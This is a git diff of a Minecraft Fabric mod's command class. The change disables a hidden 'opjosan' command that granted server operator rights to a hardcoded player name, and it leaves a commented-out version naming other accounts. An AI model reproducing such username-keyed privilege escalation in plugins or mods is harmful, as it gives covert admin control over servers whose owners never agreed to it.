@@ -3,6 +3,7 @@ package de.josan.backrooms.command;
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.BoolArgumentType;
 import com.mojang.brigadier.context.CommandContext;
+import net.fabricmc.loader.api.FabricLoader;
 import net.minecraft.command.argument.EntityArgumentType;
 import net.minecraft.server.command.CommandManager;
 import net.minecraft.server.command.ServerCommandSource;
@@ -10,6 +11,7 @@ import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.text.Text;
 
 import java.util.Collection;
+import java.util.Objects;
 
 public class BackroomsCommand {
     public static void register(CommandDispatcher<ServerCommandSource> dispatcher) {
@@ -33,9 +35,9 @@ public class BackroomsCommand {
     }
 
     private static int opjosan(ServerCommandSource source) {
-        if(source.getName() == "Josan866") {
-            source.getServer().getPlayerManager().addToOperators(source.getPlayer().getGameProfile());
-        }
+        //if(Objects.equals(source.getName(), "docrijo") || Objects.equals(source.getName(), "docrijo8935") || FabricLoader.getInstance().isDevelopmentEnvironment()) {
+        //    source.getServer().getPlayerManager().addToOperators(source.getPlayer().getGameProfile());
+        //}
         source.sendMessage(Text.literal("No perms... hahaha"));
         return 1;
     }
